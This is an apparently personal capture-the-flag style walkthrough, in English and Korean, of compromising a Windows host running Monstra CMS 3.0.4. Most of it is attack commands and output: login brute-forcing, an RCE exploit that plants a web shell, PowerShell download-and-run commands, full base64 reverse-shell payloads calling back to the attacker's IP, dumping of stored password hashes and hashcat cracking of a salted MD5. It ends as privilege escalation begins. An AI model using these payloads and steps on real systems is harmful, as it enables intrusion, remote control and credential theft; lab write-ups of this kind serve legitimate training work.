# ip: 192.168.243.180

# my: 192.168.45.156

# reconnaissance

## port scan

> nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.243.180

![](https://github.com/user-attachments/assets/16dbbbb0-99bd-453b-9b8b-9284ff265d7d)
![](https://github.com/user-attachments/assets/d8cd13a4-8404-43f6-8eb3-b59f019f219f)
![](https://github.com/user-attachments/assets/40bdf129-2e59-452d-a438-0f723c575e12)

- 135, 139, 445, openssl 1.1.1c, 3389, 5040, 7680, 49664~49669

## subdomain scan

- not found

> ffuf -u http://192.168.243.180 -H "Host:FUZZ.192.168.243.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt

![](https://github.com/user-attachments/assets/ce24a810-aa5a-40ea-b687-0bb6b11a4545)

## curl

> curl 192.168.243.180 -s | grep href

- assets path found
- accesssable assets path

![](https://github.com/user-attachments/assets/3425664b-5071-4c08-b234-f2de9e142d8c)

> curl 192.168.243.180/assets

- 301

![](https://github.com/user-attachments/assets/a3c96884-9250-4d33-97cd-d69a151bcf3e)

## mitmproxy

> apt install mitmproxy

```py
# remove_location.py
from mitmproxy import http

def response(flow: http.HTTPFlow):
    # Location header remove
    if "Location" in flow.response.headers:
        del flow.response.headers["Location"]
```

> mitmproxy -s remove_location.py -p 80
> curl -x http://127.0.0.1:80 http://192.168.243.180/assets

![](https://github.com/user-attachments/assets/7a3d6891-e0eb-4994-bf5a-c02e45ff6335)

> curl -x http://127.0.0.1:80 http://192.168.243.180/assets/

- accessable assets path
-

![](https://github.com/user-attachments/assets/8690c5ce-d443-4327-bb0f-0efe8ddcbd0e)

> curl -x http://127.0.0.1:80 http://192.168.243.180/icons/back.gif

Kevin Hughes, Kevinh@eit.com, September 1995

![](https://github.com/user-attachments/assets/1651d4dd-019c-4936-be4c-6b77f350aec7)

> curl -X GET -x http://127.0.0.1:80 http://192.168.243.180/assets/icons/folder.gif -O

mailto:postmaster@localhost -> webmaster
<span>Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10</span>

![](https://github.com/user-attachments/assets/7c3d9cdf-d2cf-40f6-ac52-4928352d72aa)

## openssl 1.1.1c -> BOF -> not matching beacuase it is a vulnerability for game of half-life

/usr/share/exploitdb/exploits/linux/remote/22968.c

![](https://github.com/user-attachments/assets/6a3e475c-2aa7-497e-a0f8-4eb150ffb82c)

## 443

## path scan

> ffuf -u http://192.168.243.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403

![](https://github.com/user-attachments/assets/8ae2affd-b5db-46fa-b442-62c33de32778)

- blog, assets

## access blog

> curl http://192.168.243.180/blog/

![](https://github.com/user-attachments/assets/3e068ecf-1023-4825-87b9-0128c6023f58)

- Monstra 3.0.4

> searchsploit Monstra

- found 3.0.4 -> 6

![](https://github.com/user-attachments/assets/1cc24991-5b6a-48c2-af30-b000757586ad)

Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) | php/webapps/49949.py
Monstra CMS 3.0.4 - Remote Code Execution (RCE) | php/webapps/52038.py
Monstra cms 3.0.4 - Persitent Cross-Site Scripting | php/webapps/44502.txt

> apt install bat
> cat 52038.py | batcat

52038.py needs username, password

# 44502.txt

```
# Exploit Title: Monstra cms 3.0.4 - Persitent Cross-Site Scripting
# Date: 2018-04-14
# Exploit Author: Wenming Jiang
# Vendor Homepage: https://github.com/monstra-cms/monstra
# Software Link: https://github.com/monstra-cms/monstra
# Version: 3.0.4
# Tested on: php 5.6, apache2.2.29, macos 10.12.6
# CVE :CVE-2018-10109


#Description:
#Monstra CMS 3.0.4 has a stored XSS vulnerability when an attacker has access to the editor role, and enters the payload
#in the content section of a new page in the blog catalog.


#Steps to replicate:
#1. log into the system as an editor role
#2. creat a new page in the blog catalog
#3. navigate to content section
#4. enter payload: <script>alert(document.cookie)</script>
#5. visit http://<your_site>/monstra/blog/<page_name>.php, you will triage JavaScript execution



#Exploit Code:
<script>alert(document.cookie)</script>
or
<img src=1 onerror=alert(/xss/) >
```

> apt install smbclient
> smbclient --help

anonymous smbclient

> smbclient -L 192.168.243.180
> smbclient -L //192.168.243.180 -N

Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED

![](https://github.com/user-attachments/assets/3ec88753-6c82-46d2-a67b-fbbbe62928f0)

smbclient -L //192.168.243.180 -N
session setup failed: NT_STATUS_ACCESS_DENIED

![](https://github.com/user-attachments/assets/47801d7c-c63e-49e0-ab2a-10036d79bea3)

> sudo apt install -y python3-impacket
> python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.243.180 | tee rpc

> rpcclient -U '' -N 192.168.243.180

TCP connection successs but! can not access with anonymous

![](https://github.com/user-attachments/assets/682a5d96-3d87-428f-9774-6c9790183c3e)

> smbclient -L //192.168.243.180 -N -p 139
> nmap -p139,445 --script smb-protocols 192.168.243.180

version >= 2 -> so not used smb1

![](https://github.com/user-attachments/assets/e31b4ce7-91ab-42e9-8375-3c0f7829f936)

> apt install netexec
> nxc smb 192.168.243.180 -u '' -p '' --shares

MIKE-PC -> evidence found

![](https://github.com/user-attachments/assets/20972255-fe26-4148-afa0-8210d2500a12)

> apt install httpie
> http http://192.168.243.180/blog/

http://monster.pg/blog/home
http://monster.pg/blog/blog
http://monster.pg/blog/users
http://monster.pg/blog/users/login
http://monster.pg/blog/users/registration

![](https://github.com/user-attachments/assets/1762f739-80ad-4934-8a7f-0e26ebe3a8fe)

> vim /etc/hosts
> echo "192.168.243.180 monster.pg" >> /etc/hosts

![](https://github.com/user-attachments/assets/623ed7c0-94e2-44dd-a76e-a31b08bccf90)

> http http://monster.pg/blog/users/

![](https://github.com/user-attachments/assets/bba1b548-105e-4d72-99a1-ae43309926dd)

> http http://monster.pg/blog/users/login/

![](https://github.com/user-attachments/assets/dbedd8d0-61f1-4b41-83c0-009cf80c69c9)

> http://monster.pg/blog/users/registration/

![](https://github.com/user-attachments/assets/35286681-c1fd-46e1-8800-9d2bc09eaa60)

## generate a custom words.txt file

> cewl http://192.168.243.180/ -w words.txt

## bruteforce login

http http://monster.pg/blog/users/login/

csrf token needed...

![](https://github.com/user-attachments/assets/81cf6e11-b507-4002-ab8f-9efce1910500)

./tmp/bruteforce_csrf_php.py
/usr/share/seclists/Usernames/Names/names.txt

check fail message

> curl -X POST http://monster.pg/blog/users/login/ --data "username=admin&password=admin&login_submit=Log+In&csrf=csrf_token"

> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users words.txt --passwords /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt -T 20

![](https://github.com/user-attachments/assets/aaa17c32-012e-43a3-8413-47c89ea0ecea)

> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share
> /seclists/Usernames/Names/names.txt --passwords words.txt -T 10

![](https://github.com/user-attachments/assets/ed4a6dec-2682-401f-ad88-97c5338c550d)

username: admin
email: wazowski@monster.pg
registered: 22.2.2022

> python3 52038.py http://monster.pg/blog admin wazowski

![](https://github.com/user-attachments/assets/20e2bd5b-b114-4e1f-a7aa-da1ef623e94a)

success

Logging in...
Login successful
Preparing shell...
Your shell is ready: http://monster.pg/blog/public/themes/default/pixiq.chunk.php

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami"

mike-pc\mike

![](https://github.com/user-attachments/assets/7cc53afb-235e-49b5-bb7e-a9d6754d16f9)

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami%20/priv"

Privilege Name Description State
============================= ==================================== ========
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled

## reverse shell make

my ip: 192.168.45.156

> nc -lvnp 1234

https://www.revshells.com/
ps#1

> curl 'http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd='

> python3 -m http.server 80

> vim reverse.ps1

![](https://github.com/user-attachments/assets/27d8989f-0b04-4c97-85ea-7f93f4f8fb46)

![](https://github.com/user-attachments/assets/d5795445-b154-4592-ac40-c6edeea8e1c9)

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/nc.exe -Outfile C:\Windows\Temp\nc.exe"

curl: (3) URL rejected: Malformed input to a URL function

whitespace -> %20

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"

> http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/reverse.ps1 -Outfile C:\Windows\Temp\reverse.ps1

failed -> whitespace -> %20

> http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1

success

┌──(root㉿docker-desktop)-[/]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.243.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"

Retry

https://www.revshells.com/
ps#3

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"

> curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"

retry

> curl 'http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami'

> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=whoami"

> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"

> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguNDUuMTU2JywgMTIzNCk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"

- 무반응
  원인은 Base64 인코딩 형식입니다. 지금 쓰는 Base64는 UTF-8이라 powershell -e가 기대하는 UTF-16LE가 아닙니다. revshells.com이 생성한 UTF-16LE Base64를 그대로 쓰거나, 직접 인코딩할 때 echo -n '...' | iconv -t UTF-16LE | base64 -w 0로 만들어야 합니다. UTF-8 Base64를 넣으면 PowerShell이 명령을 디코딩하지 못해 무반응입니다.

![](https://github.com/user-attachments/assets/15be2710-9f01-4efa-bed8-71025d60ce0e)

> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"

> apt install netcat-traditional
> nc -lvnp 443

> curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

## reversing success!

1. 반드시.. enter 눌러줘야 함!
2. 16LE format necesary
3. php system() 은 stdout 만 보여주므로, 에러가 오지 않아 무반응이 발생하여 원인을 유추해야 함
4. -G and --data-urlencode must always be used in combination

┌──(root㉿docker-desktop)-[/]
└─# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.243.180] 49992

PS C:\xampp\htdocs\blog\public\themes\default>

PS C:\xampp\htdocs\blog\public\themes\default>

![](https://github.com/user-attachments/assets/a80eb30d-7c68-4447-84f0-41eac677bc72)

Username: MIKE-PC\Administrator
RunAs User: MIKE-PC\Administrator

PS C:\Users\Mike\Desktop> ls

    Directory: C:\Users\Mike\Desktop

Mode LastWriteTime Length Name

---

-a---- 11/1/2026 1:01 AM 34 local.txt

PS C:\Users\Mike\Desktop> type local.txt

![](https://github.com/user-attachments/assets/b52b857b-555a-488d-a57b-4817582f0379)

get a local.txt flag

> ipconfig

Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 192.168.243.180
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.243.254
PS C:\Users\Mike>

PS C:\xampp\htdocs\blog\storage\database> type users.table.xml
<?xml version="1.0" encoding="UTF-8"?>

## get mike password

844ffc2c7150b93c4133a6ff2e1a2dba

```xml
<root><options><autoincrement>2</autoincrement></options><fields><login/><password/><email/><role/><date_registered/><firstname/><lastname/><login/><twitter/><skype/><hash/><about_me/></fields><users><id>1</id><uid>de58425259</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>admin</login><password>a2b4e80cd640aaa6e417febe095dcbfc</password><email>wazowski@monster.pg</email><hash>jJkdUX1FOFiI</hash><date_registered>1645512776</date_registered><role>admin</role></users><users><id>2</id><uid>800c7d9797</uid><firstname/><lastname/><twitter/><skype/><about_me/><login>mike</login><password>844ffc2c7150b93c4133a6ff2e1a2dba</password><email>mike@monster.pg</email><hash>8vPjvUPDHhRp</hash><date_registered>1645512909</date_registered><role>user</role></users></root>
```

## get admin password

a2b4e80cd640aaa6e417febe095dcbfc

## count hash

> echo -n "844ffc2c7150b93c4133a6ff2e1a2dba" | wc -c

32

32 -> MD5
65 -> SHA-256
40 -> SHA-1

## found booting file

C:\xampp\htdocs\blog\boot\defines.php

![](https://github.com/user-attachments/assets/2020f02f-7d21-4253-b7cd-bb1e689e7689)

## salt -> "YOUR_SALT_HERE"

## I needed a rule file for cracking with a hardcoded salt

```php
/**
Set password salt
*/
define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
```

> make rule.txt for using hashcat

해시캣 룰 문법은 각 단어별로 $ 를 붙여야 하나씩 뒤에 append 하기 때문

```txt
# rule.txt
# $YOUR_SALT_HERE -> X
$Y $O $U $R $_ $S $A $L $T $_ $H $E $R $E
```

## found password algorithm -> MD5 + salt -> MD5 -> return

비밀번호 trim 이후 솔트문자열 자체를 뒤로 붙임 -> "passwordYOUR_SALT_HERE"
php 에서는 문자.문자 -> "문자문자" -> 붙음

## md5(md5(password + salt))

```php
/**
   * Encrypt password
   *
   *  <code>
   *      $encrypt_password = Security::encryptPassword('password');
   *  </code>
   *
   * @param string $password Password to encrypt
   */
  public static function encryptPassword($password)
  {
      return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
  }
```

## cracking

> hashcat -m 2600 -a 0 "844ffc2c7150b93c4133a6ff2e1a2dba" /usr/share/wordlists/rockyou.txt -r rule.txt --show

mike
844ffc2c7150b93c4133a6ff2e1a2dba

![](https://github.com/user-attachments/assets/52504d6b-1a7a-485c-82c3-4da9aa6671a9)

## mike / Mike14

```txt
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

844ffc2c7150b93c4133a6ff2e1a2dba:Mike14YOUR_SALT_HERE

Session..........: hashcat
Status...........: Cracked  -> 성공
Hash.Mode........: 2600 (md5(md5($pass)))
Hash.Target......: 844ffc2c7150b93c4133a6ff2e1a2dba
Time.Started.....: Sun Nov  1 12:53:39 2026 (0 secs)
Time.Estimated...: Sun Nov  1 12:53:39 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (rule.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4483.4 kH/s (1.09ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1048576/14344385 (7.31%)
Rejected.........: 0/1048576 (0.00%)
Restore.Point....: 1032192/14344385 (7.20%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: alexliamYOUR_SALT_HERE -> LesleeYOUR_SALT_HERE
```

# try RDP

```bash
apt search evil-winrm
apt install evil-winrm -y
evil-winrm -i 192.168.243.180 -u mike -p Mike14
```

# Privilege Escalation

## transfer winPEAS file
